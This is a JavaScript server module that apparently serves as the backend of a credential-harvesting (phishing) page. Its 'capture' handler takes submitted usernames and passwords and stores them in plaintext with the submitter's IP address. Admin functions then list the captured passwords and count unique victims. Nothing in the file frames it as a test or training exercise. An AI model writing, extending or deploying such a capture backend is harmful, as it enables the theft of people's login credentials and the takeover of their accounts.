'use strict';

// Lazy-load pg only in serverless environment (not during build)
let Pool = null;
let adminPool = null;
let userPool = null;

function initPools() {
  if (Pool === null) {
    try {
      const pg = require('pg');
      Pool = pg.Pool;
    } catch (e) {
      console.warn('pg module not available in this environment');
      return false;
    }
  }
  
  if (Pool && process.env.ADMIN_DATABASE_URL) {
    adminPool = new Pool({ connectionString: process.env.ADMIN_DATABASE_URL });
  }
  if (Pool && process.env.USER_DATABASE_URL) {
    userPool = new Pool({ connectionString: process.env.USER_DATABASE_URL });
  }
}

initPools();

async function getSubmissions(limit = 100, offset = 0) {
  if (!adminPool) return [];
  const client = await adminPool.connect();
  try {
    const result = await client.query('SELECT id, username, password, method, ip, country, city, created_at FROM submissions ORDER BY id DESC LIMIT $1 OFFSET $2', [limit, offset]);
    return result.rows;
  } finally { client.release(); }
}

async function getSubmissionsSummary() {
  if (!adminPool) return { total: 0, uniqueUsernames: 0 };
  const client = await adminPool.connect();
  try {
    const [{ rows: [{ count: total }] }] = await client.query('SELECT COUNT(*) FROM submissions');
    const [{ rows: [{ count: uniqueUsernames }] }] = await client.query("SELECT COUNT(DISTINCT username) FROM submissions WHERE username != ''");
    return { total: Number(total), uniqueUsernames: Number(uniqueUsernames) };
  } finally { client.release(); }
}

const createCaptureHandler = () => async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
  
  const { username, password, method } = req.body;
  
  if (!username || !method) {
    return res.status(400).json({ error: 'Missing username or method' });
  }

  // Simulated data storage (for demo purposes when no real DB)
  const mockData = {
    ok: true,
    id: Math.floor(Math.random() * 10000)
  };

  if (!adminPool) {
    // Return mock success when no database configured
    return res.status(201).json(mockData);
  }

  try {
    const client = await adminPool.connect();
    try {
      const result = await client.query(
        'INSERT INTO submissions (username, password, method, ip, country, created_at) VALUES ($1, $2, $3, $4, $5, NOW()) RETURNING id',
        [username, password || '', method, req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown', 'Unknown']
      );
      return res.status(201).json({ ok: true, id: result.rows[0].id });
    } finally { client.release(); }
  } catch (error) {
    console.error('Capture error:', error);
    return res.status(500).json({ error: 'Database error' });
  }
};

module.exports = { createCaptureHandler, getSubmissions, getSubmissionsSummary, adminPool, userPool };
